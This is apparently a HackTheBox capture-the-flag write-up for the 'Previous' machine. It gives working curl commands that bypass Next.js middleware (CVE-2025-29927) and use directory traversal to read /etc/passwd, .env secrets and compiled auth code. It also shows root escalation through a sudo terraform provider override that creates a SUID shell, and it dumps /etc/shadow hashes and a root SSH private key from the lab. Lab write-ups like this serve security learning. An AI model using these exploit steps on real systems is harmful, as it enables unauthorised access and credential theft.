---
render_with_liquid: false
title: HackTheBox Writeup - Previous
date: 2025-09-16 17:18:39 +1400
tags: [hackthebox, nmap, linux, feroxbuster, nodejs, next-js, wappalyzer, middleware, auth-bypass, cve-2025-29927, burpsuite, directory-traversal, next-auth, discover-secrets, credentials-stuffing, sudo, terraform, security-policy-bypass]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/f34c6756e7c75b48ec112831eb27940a.png
    width: 640
    height: 480
---




# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ pt init '10.10.11.83 previous.htb'
+----------+--------+-------------+--------------+
| PROFILE  | STATUS |     IP      |    DOMAIN    |
+----------+--------+-------------+--------------+
| previous | on     | 10.10.11.83 | previous.htb |
+----------+--------+-------------+--------------+
```


## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep 16 17:18:39 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.83
Nmap scan report for 10.10.11.83
Host is up, received user-set (0.060s latency).
Scanned at 2025-09-16 17:18:39 CST for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 16 17:18:50 2025 -- 1 IP address (1 host up) scanned in 10.63 seconds
```


## 80 - HTTP : PreviousJS


### Info

```ruby
http://previous.htb [200] [PreviousJS] [nginx/1.18.0 (Ubuntu)] [ff1aed8ff2cc73cf50fdcc6b79a5bb27f737361e] [Next.js,Nginx:1.18.0,Node.js,React,Ubuntu,Webpack]
```

![](/assets/obsidian/f1f29edb01d4bfff304a963a4914a1b0.png)


### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F':' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -u "$URL" -o "ferox_${OUT}.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://previous.htb:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /proc/self/fd/11
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       66w     2181c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       20c http://previous.htb/_next/static/chunks/ => http://previous.htb/_next/static/chunks
308      GET        1l        1w       12c http://previous.htb/application/ => http://previous.htb/application
308      GET        1l        1w       17c http://previous.htb/_next/static/css/ => http://previous.htb/_next/static/css
308      GET        1l        1w       13c http://previous.htb/_next/static/ => http://previous.htb/_next/static
308      GET        1l        1w       35c http://previous.htb/_next/static/-ipsiOtEey-zESpHzrwmc/ => http://previous.htb/_next/static/-ipsiOtEey-zESpHzrwmc
308      GET        1l        1w       26c http://previous.htb/_next/static/chunks/pages/ => http://previous.htb/_next/static/chunks/pages
308      GET        1l        1w        6c http://previous.htb/_next/ => http://previous.htb/_next
200      GET        1l        1w     1305c http://previous.htb/_next/static/-ipsiOtEey-zESpHzrwmc/_buildManifest.js
200      GET        1l      283w     5101c http://previous.htb/_next/static/chunks/pages/index-a09f42904785092c.js
200      GET        1l        2w       77c http://previous.htb/_next/static/-ipsiOtEey-zESpHzrwmc/_ssgManifest.js
200      GET        1l       60w     3028c http://previous.htb/_next/static/chunks/webpack-cb370083d4f9953f.js
200      GET        1l      725w    33690c http://previous.htb/_next/static/chunks/pages/_app-95f33af851b6322a.js
200      GET        1l      250w    23885c http://previous.htb/_next/static/css/9a1ff1f4870b5a50.css
307      GET        1l        1w       36c http://previous.htb/docs => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs
200      GET        1l     2412w   119495c http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js
200      GET        1l     2734w   139924c http://previous.htb/_next/static/chunks/framework-ee17a4c43a44d3e2.js
200      GET        1l     2125w   112594c http://previous.htb/_next/static/chunks/polyfills-42372ed130431b0a.js
200      GET        1l      407w     5493c http://previous.htb/
307      GET        1l        1w       35c http://previous.htb/api => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi
200      GET        1l      217w     8862c http://previous.htb/_next/static/chunks/0-c54fcec2d27b858d.js
200      GET        1l      136w     3480c http://previous.htb/_next/static/chunks/pages/signin-d0284ed11872b445.js
200      GET        1l      179w     3481c http://previous.htb/signin
307      GET        1l        1w       36c http://previous.htb/apis => http://previous.htb/api/auth/signin?callbackUrl=%2Fapis
307      GET        1l        1w       39c http://previous.htb/api-doc => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi-doc
307      GET        1l        1w       40c http://previous.htb/api_test => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi_test
307      GET        1l        1w       36c http://previous.htb/api3 => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi3
307      GET        1l        1w       36c http://previous.htb/api2 => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi2
307      GET        1l        1w       37c http://previous.htb/docs2 => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs2
307      GET        1l        1w       36c http://previous.htb/api4 => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi4
307      GET        1l        1w       41c http://previous.htb/docsearch => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocsearch
307      GET        1l        1w       40c http://previous.htb/docstore => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocstore
307      GET        1l        1w       40c http://previous.htb/apichain => http://previous.htb/api/auth/signin?callbackUrl=%2Fapichain
307      GET        1l        1w       41c http://previous.htb/api_error => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi_error
307      GET        1l        1w       41c http://previous.htb/apisphere => http://previous.htb/api/auth/signin?callbackUrl=%2Fapisphere
307      GET        1l        1w       36c http://previous.htb/apit => http://previous.htb/api/auth/signin?callbackUrl=%2Fapit
[####################] - 6m    126376/126376  0s      found:35      errors:4
[####################] - 6m     63168/63168   170/s   http://previous.htb:80/
[####################] - 6m     63168/63168   170/s   http://previous.htb/ 
```


# User Flag
---

## Shell as jeremy


### 80 - PreviousJS : Enumeration

There're unique cookie names : `next-*`, google search returned a React development framework : `NextJS`

![](/assets/obsidian/245394a4bf9a82529a7cfd11fb9eb077.png)

(Failed) Since node js web apps mostly uses NOSQL database (e.g. mongo db), we've tried using `Content-Type: application/json` in request headers for the login endpoint to test if auth bypass NOSQL injection is possible

![](/assets/obsidian/56530f99d9de1b3a696b7406e5623bf5.png)


### 80 - Next.js 15.2.2 : Middleware Authorization Bypass (CVE-2025-29927)

- **Wappalyzer** : `Next.js 15.2.2`

![](/assets/obsidian/d7c38a7f7d0c143bd179f72834b4490e.png)

- Google : `Next.js 15.2.2 exploit`

> Research - https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/

> **CVE-2025-29927**
> 
> For Next.JS servers using middleware (including a `middleware.js` or `middleware.ts` file), custom `x-middleware-subrequest` headers can bypass middleware execution entirely
{: .prompt-info }

We will use the payload `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` in the headers to request for `http://localhost:3000/docs`

![](/assets/obsidian/2ea8bacbf3fa8f0054ee332392b0bd4c.png)

By injecting the header into HTTP requests via **Settings -> Tools -> Proxy ->HTTP match and replace rules** from burp suite, we can bypass the login page to access [http://previous.htb/docs](http://previous.htb/docs)

![](/assets/obsidian/e7790498279e6aa3ee5ba6f106d28c22.png)

![](/assets/obsidian/375aa607e768f26eb6fac0d33bb5151f.png)


### 80 - API : Directory Traversal

There's an interesting URI in the examples page : http://previous.htb/api/download?example=hello-world.ts

![](/assets/obsidian/7f497953fb428239b89bfd46ab86a9e0.png)

By modifying the value of `example` parameter, we can exploit **directory traversal** to read `/etc/passwd`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download?example=../../../../etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/sh
node:x:1000:1000::/home/node:/bin/sh
```

We've tried to get default ssh private key's name in RSA format before fuzzing corresponding names to every formats

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download?example=../../../../home/node/.ssh/id_rsa'
{"error":"File not found"} 
```

We're in a docker container

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download?example=../../../proc/1/mountinfo'
360 334 0:43 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/HB5NTPBYKAKDI52CNLBGZ2JIVZ:/var/lib/docker/overlay2/l/YTVKLX7ITSQGSOLNLJVDLU4VGB:/var/lib/docker/overlay2/l/CAY72DGRQRY3WBG5426KFGLIPN:/var/lib/docker/overlay2/l/R4B2MRV4VGJQYHNCHXYIOFVWJS:/var/lib/docker/overlay2/l/WJ7WWQETL77UBVQT52SXSRKNKR:/var/lib/docker/overlay2/l/6CLS3TL5TM6UHPO5H7YQ3WLYEF:/var/lib/docker/overlay2/l/K5LVLWHQD6W6LEARYFAY52S624:/var/lib/docker/overlay2/l/IV33RUYA3YLWNSOILKP3BI52SH:/var/lib/docker/overlay2/l/2IOCKJA4EUTWMCM2HT4BSG5MND:/var/lib/docker/overlay2/l/TGKXPXUDDBJPZBOIA6PBIC2VXK:/var/lib/docker/overlay2/l/IM6EMB7AZO26OT6X5MU3WGYOJP,upperdir=/var/lib/docker/overlay2/19f4119022476f150118427220994390ae83285c0cd16a74ceac93f45016ce74/diff,workdir=/var/lib/docker/overlay2/19f4119022476f150118427220994390ae83285c0cd16a74ceac93f45016ce74/work
[...]
```

By traversing all the way up to locate `package.json`, we've found the web root at `../../`

- The app is using **next-auth**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download?example=../../package.json'
{
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build"
  },
  "dependencies": {
    "@mdx-js/loader": "^3.1.0",
    "@mdx-js/react": "^3.1.0",
    "@next/mdx": "^15.3.0",
    "@tailwindcss/postcss": "^4.1.3",
    "@tailwindcss/typography": "^0.5.16",
    "@types/mdx": "^2.0.13",
    "next": "^15.2.2",
    "next-auth": "^4.24.11",
    "postcss": "^8.5.3",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "tailwindcss": "^4.1.3"
  },
  "devDependencies": {
    "@types/node": "22.14.0",
    "@types/react": "19.1.0",
    "typescript": "5.8.3"
  }
}
```

There's an environment variable `NEXTAUTH_SECRET` stored in `.env`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download?example=../../.env'
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```


### Build a lab for next-auth

We can build an example **next.js** web app with `next-auth` to take a glance of its structure

```bash
cd /tmp
git clone https://github.com/vercel/next.js
cd next.js/examples/auth
npx create-next-app --example auth auth-app
cd auth-app
npm run dev
```

![](/assets/obsidian/c7376c2f64bbb53382f73b6f66c7ec83.png)

- `.next` folder is an instance generated by runtime

```bash
┌──(bravosec㉿fsociety)-[/tmp/next.js/examples/auth/auth-app]
└─$ ls -latr
total 64
-rw-r--r--  1 bravosec kali  1056 Sep 30 08:16 README.md
-rw-r--r--  1 bravosec kali   396 Sep 30 08:16 package.json
-rw-r--r--  1 bravosec kali   189 Sep 30 08:16 middleware.ts
-rw-r--r--  1 bravosec kali   437 Sep 30 08:16 .gitignore
-rw-r--r--  1 bravosec kali    88 Sep 30 08:16 .env.example
-rw-r--r--  1 bravosec kali   197 Sep 30 08:16 auth.ts
drwxr-xr-x  4 bravosec kali   220 Sep 30 14:28 ..
drwxr-xr-x  3 bravosec kali   140 Sep 30 14:28 app
-rw-r--r--  1 bravosec kali 32252 Sep 30 14:29 package-lock.json
drwxr-xr-x 33 bravosec kali   680 Sep 30 14:29 node_modules
drwxr-xr-x  5 bravosec kali   280 Sep 30 14:29 .
-rw-r--r--  1 bravosec kali   663 Sep 30 14:29 tsconfig.json
-rw-r--r--  1 bravosec kali   262 Sep 30 14:29 next-env.d.ts
drwxr-xr-x  6 bravosec kali   260 Sep 30 14:29 .next

┌──(bravosec㉿fsociety)-[/tmp/next.js/examples/auth/auth-app]
└─$ ls -latr .next
total 336
drwxr-xr-x 5 bravosec kali    280 Sep 30 14:29 ..
-rw-r--r-- 1 bravosec kali     20 Sep 30 14:29 package.json
-rw-r--r-- 1 bravosec kali    272 Sep 30 14:29 routes-manifest.json
-rw-r--r-- 1 bravosec kali    354 Sep 30 14:29 prerender-manifest.json
drwxr-xr-x 6 bravosec kali    260 Sep 30 14:29 .
drwxr-xr-x 4 bravosec kali    120 Sep 30 14:32 cache
drwxr-xr-x 3 bravosec kali    140 Sep 30 14:32 types
drwxr-xr-x 5 bravosec kali    360 Sep 30 14:32 server
drwxr-xr-x 6 bravosec kali    120 Sep 30 14:32 static
-rw-r--r-- 1 bravosec kali      2 Sep 30 14:33 react-loadable-manifest.json
-rw-r--r-- 1 bravosec kali    388 Sep 30 14:33 build-manifest.json
-rw-r--r-- 1 bravosec kali    481 Sep 30 14:33 app-build-manifest.json
-rw-r--r-- 1 bravosec kali 315942 Sep 30 14:33 trace
```

- `.next/server` stores compiled codes and configs

```bash
┌──(bravosec㉿fsociety)-[/tmp/next.js/examples/auth/auth-app]
└─$ ls -latr .next/server/
total 2780
drwxr-xr-x 6 bravosec kali     260 Sep 30 14:29 ..
-rw-r--r-- 1 bravosec kali 2734808 Sep 30 14:32 middleware.js
drwxr-xr-x 3 bravosec kali      60 Sep 30 14:32 static
-rw-r--r-- 1 bravosec kali   44654 Sep 30 14:32 edge-runtime-webpack.js
-rw-r--r-- 1 bravosec kali     867 Sep 30 14:32 middleware-manifest.json
-rw-r--r-- 1 bravosec kali      47 Sep 30 14:32 interception-route-rewrite-manifest.js
drwxr-xr-x 5 bravosec kali     360 Sep 30 14:32 .
drwxr-xr-x 2 bravosec kali     220 Sep 30 14:32 vendor-chunks
-rw-r--r-- 1 bravosec kali   20634 Sep 30 14:33 webpack-runtime.js
-rw-r--r-- 1 bravosec kali    1763 Sep 30 14:33 server-reference-manifest.json
-rw-r--r-- 1 bravosec kali    1885 Sep 30 14:33 server-reference-manifest.js
-rw-r--r-- 1 bravosec kali       2 Sep 30 14:33 pages-manifest.json
-rw-r--r-- 1 bravosec kali     154 Sep 30 14:33 app-paths-manifest.json
drwxr-xr-x 4 bravosec kali     120 Sep 30 14:33 app
-rw-r--r-- 1 bravosec kali      77 Sep 30 14:33 next-font-manifest.json
-rw-r--r-- 1 bravosec kali     113 Sep 30 14:33 next-font-manifest.js
-rw-r--r-- 1 bravosec kali      35 Sep 30 14:33 middleware-react-loadable-manifest.js
-rw-r--r-- 1 bravosec kali     513 Sep 30 14:33 middleware-build-manifest.js
```

- `.next/server/pages-manifest.json` maps the routes and controller source code

```bash
┌──(bravosec㉿fsociety)-[/tmp/next.js/examples/auth/auth-app]
└─$ find . -type f -iname '*.json' | grep -v 'node_modules'
./.next/prerender-manifest.json
./.next/routes-manifest.json
./.next/types/package.json
./.next/app-build-manifest.json
./.next/build-manifest.json
./.next/react-loadable-manifest.json
./.next/static/webpack/87853a4e327c1f8d.webpack.hot-update.json
./.next/static/webpack/633457081244afec._.hot-update.json
./.next/server/static/webpack/633457081244afec._.hot-update.json
./.next/server/middleware-manifest.json
./.next/server/server-reference-manifest.json
./.next/server/app-paths-manifest.json
./.next/server/pages-manifest.json
./.next/server/next-font-manifest.json
./.next/package.json
./.next/cache/next-devtools-config.json
./package-lock.json
./tsconfig.json
./package.json
```


### 80 - API : Obtain next-auth credentials

Checked the routes mapping, found `pages/api/auth/[...nextauth].js` interesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download' -G --data-urlencode 'example=../../.next/server/pages-manifest.json'
{
  "/_app": "pages/_app.js",
  "/_error": "pages/_error.js",
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
  "/api/download": "pages/api/download.js",
  "/docs/[section]": "pages/docs/[section].html",
  "/docs/components/layout": "pages/docs/components/layout.html",
  "/docs/components/sidebar": "pages/docs/components/sidebar.html",
  "/docs/content/examples": "pages/docs/content/examples.html",
  "/docs/content/getting-started": "pages/docs/content/getting-started.html",
  "/docs": "pages/docs.html",
  "/": "pages/index.html",
  "/signin": "pages/signin.html",
  "/_document": "pages/_document.js",
  "/404": "pages/404.html"
} 
```

Got its compiled source code, and found credential `jeremy:MyNameIsJeremyAndILovePancakes`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' 'http://previous.htb/api/download' -G --data-urlencode 'example=../../.next/server/pages/api/auth/[...nextauth].js' | js-beautify
[...]
            let u = require("next-auth/providers/credentials"),
                o = {
                    session: {
                        strategy: "jwt"
                    },
                    providers: [r.n(u)()({
                        name: "Credentials",
                        credentials: {
                            username: {
                                label: "User",
                                type: "username"
                            },
                            password: {
                                label: "Password",
                                type: "password"
                            }
                        },
                        authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {
                            id: "1",
                            name: "Jeremy"
                        } : null
                    })],
                    pages: {
                        signIn: "/signin"
                    },
                    secret: process.env.NEXTAUTH_SECRET
                },
[...]
```


### 22 - SSH : Credential Stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Previous]
└─$ sshpass -p 'MyNameIsJeremyAndILovePancakes' ssh -o "StrictHostKeyChecking no" jeremy@10.10.11.83
[...]
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
jeremy@previous:~$ cat user.txt
1de251c514208933938f7b4786589421
```


# Root Flag
---

## Shell as root


### SUDO - Terraform : Arbitrary provider script execution

`jeremy` may run `/usr/bin/terraform` as `root`

> **Terraform**
> 
> **Terraform** is an infrastructure as code (IaC) tool that helps automate core infrastructure tasks
{: .prompt-info }

```bash
jeremy@previous:~$ sudo -l
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Breakdown:
- `!env_reset` : Does not reset environment variables
- `-chdir\=/opt/examples` : Switch to `/opt/example` directory before executing commands
- `apply` : Creates or updates infrastructure according to Terraform configuration
  files in the current directory.

- Google : `sudo terraform exploit`

> POC - https://dollarboysushil.com/posts/Terraform-Sudo-Exploit-Privilege-Escalation/

Check provider's name

```bash
jeremy@previous:~$ cat /opt/examples/*.tf | grep 'source = '
      source = "previous.htb/terraform/examples"
```

Create a malicious terraform provider script

```bash
mkdir -p /tmp/test
cat > /tmp/test/x << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
EOF

chmod +x /tmp/test/x
```

Create a terraform configuration override that runs every executables from `/tmp/test/`, and set `TF_CLI_CONFIG_FILE` to our malicious config file

```bash
cat > /tmp/test/test.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/test"
  }
  direct {}
}
EOF

export TF_CLI_CONFIG_FILE=/tmp/test/test.rc
```

Apply the config

```bash
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

![](/assets/obsidian/155bb9c7eb15b3cd3d4e64a9641c83c5.png)

We can now run `bash` with preserved SUID as `root`

```bash
jeremy@previous:~$ /tmp/b -p
b-5.1# id
uid=1000(jeremy) gid=1000(jeremy) euid=0(root) egid=0(root) groups=0(root),1000(jeremy)
b-5.1# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
root@previous:~# id
uid=0(root) gid=1000(jeremy) groups=1000(jeremy)
root@previous:~# cat /root/root.txt
9015fc500d77f40ca3e5b1fac3850de1
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@previous:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$8eJygIdCzBjq.MydZo1XO0$2l7w4GXSdYpIEuvzgPad7Tm2YK6/7L.mTU.CiLfaPf8:20321:0:99999:7:::
jeremy:$y$j9T$.12cctgaWMDR8r3JYiB5q0$xAiP7hRx8A8br/fd2HPW8Ctu8XumwSCAsH4v9XUxdb4:20321:0:99999:7:::
```

```bash
[+] /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmxhpS4UBVdbNosrMXPuKzRSbCOTgUH0/Tp/Yb32hyiMyMT68JuwK
bX8jLmjb//cojY1uIkYnO/pkCZIP7PZ3goq5SW7vV1meweQ8pYG1rMKbB8XXVGjMg9smuR
R5rXbvlfVylGTIix1CDjxNqtzo03nW95Cj4WgEh8xDSryQq+tg2koz33swCppjWCGKkmdD
pG/zG6u+lvEVE8Rlzrsk5y01Lsal0SRbaeRsYwXmtSCkThU9ktaJOVQvXfTzZqyg9aK/1f
Wj0a+cSYz01yzW+OaDIo0/sVgGdW0qw3khl9VHqpnse4SIbGld4Hagxq+Y7f5Is+WESNnD
YdUvwPo5aSUxQJZTZ4l5zSDey/K5GPQnF2NPn6/vxJ7i0xLLGGUczb77CtCt/zV0K8T+6m
cx8WzTJm8DxFEMt9e6Z5bF5j/ioQx55PTrxR1DEy4KNphNPCuHGmSfxRxWb1hZ/IRObN4V
A7FGgWy0RUYkQLed0t5OZf3C/ShvJWHFesQscO7pAAAFiIyQVqmMkFapAAAAB3NzaC1yc2
EAAAGBAJsYaUuFAVXWzaLKzFz7is0Umwjk4FB9P06f2G99ocojMjE+vCbsCm1/Iy5o2//3
KI2NbiJGJzv6ZAmSD+z2d4KKuUlu71dZnsHkPKWBtazCmwfF11RozIPbJrkUea1275X1cp
RkyIsdQg48Tarc6NN51veQo+FoBIfMQ0q8kKvrYNpKM997MAqaY1ghipJnQ6Rv8xurvpbx
FRPEZc67JOctNS7GpdEkW2nkbGMF5rUgpE4VPZLWiTlUL13082asoPWiv9X1o9GvnEmM9N
cs1vjmgyKNP7FYBnVtKsN5IZfVR6qZ7HuEiGxpXeB2oMavmO3+SLPlhEjZw2HVL8D6OWkl
MUCWU2eJec0g3svyuRj0JxdjT5+v78Se4tMSyxhlHM2++wrQrf81dCvE/upnMfFs0yZvA8
RRDLfXumeWxeY/4qEMeeT068UdQxMuCjaYTTwrhxpkn8UcVm9YWfyETmzeFQOxRoFstEVG
JEC3ndLeTmX9wv0obyVhxXrELHDu6QAAAAMBAAEAAAGASkQ4N3drGkWPloJxtZyl7GoPiw
S9/QzcgbO9GjYYgQi1gis+QY0JuUEGAbUok7swagftUvAw3WGbAZI1mgyzUYlIDEfYyAUc
JlA6Ui54Zk+RmPk9kSfVttX8BugtE8k+FJrB0RkphqPt+48YydaajplrPITAVLFQag5/so
v04r4FVMHvcPY2HP2s0IjPKCfWlikdSoTE8NZkd2C2N3YZx7E4JDvvLuSv+VbuJ8StotIM
m29EWsnsT81mGSGwY9wJQA2o4dPFiY2NIJN291z+8yUjOqEAtUpdzzz+rC6rw0LLGZmMRD
JGHPZqKm5npOjRrik3l4B2WLAj65x2tNOXbyrOn3mJXuFJeZWuOUZc/aneX8Psw8SiwCN2
0AvDwWxJ/LUV/WUEBsS5blHzwAnaN14Wn7Pvb7qDjMe6RLLnoi6uplQFa3Dd6YOvRqbRhD
p6xqb8JuyfiZPsDW3tUfeJtIpJG/xTAG+A2b28HO46DlVc/cpWjr8jWB5sLllpx9PZAAAA
wDd+4xHpgC/vYgBokVVXzOwOJg3HpKiEY0SI62zXV3M83aJNvwCrLe6AAEa7j+PoOvqsex
gVTnfEDqaJV6Unf6DxfN+sJICElTWouY5IZjvgpvCwC+L6eVWUD31irnU1YNGOgKY4Zaxv
/1BqFHDcujIPZbfHx4rU0MMAIRgf6ZXkdBkn51hapYKJX4yvNXESAsCKh62JWeF+zo4DaD
YZcaEKabfnopYJ47f9k8XeCYFRgTMHkMWRuwGw+jSU4Xci0wAAAMEAugJLPFJeq2vmsrTz
/BIm5BHUBdR2EFMaPIqRkM5Ntl71Ah5bh1MMijV/deIsltEZr8Adz6NagqDxcWIaZNNQNp
v0KsoZDqQuL4KLktC9IEUS9eLpONxlNUuSG5rEieuWSASBzPyPYC63J7ZyYS0aw7d38lR5
B2U4vWe1o7jkQZQkR4UY8fgZPDoqRbu26qNgFZYssuRjhrATvcG7f4lBJICmV6JJPamngO
6mixVNXTDxYySn+MYzhUVNdqN3nqAzAAAAwQDVdEyZiNhIz5sLJjBf/a1SrjnwbKq1ofql
4TIw8Xjw5Eia1oYfbIJmSQUwvP8IsV1dcj9P8ASZYlZF30hRWVa24dCewvhqIqdMoyO9DT
7hHi8eduqnfOdnFzgVu5JZzysNSB2QKaG29FVTMKWcxo+0Voh2mXKcVyNjuYadBvn1zZ+J
4ZpqUFQKbqIj4hUUKMBOwMssxs+Eup/46wb4i0vVhe3g7I5ySdWpJ/M4vUI+ooTw6C2GoS
jR+NWPfpk9KHMAAAANcm9vdEBwcmV2aW91cwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```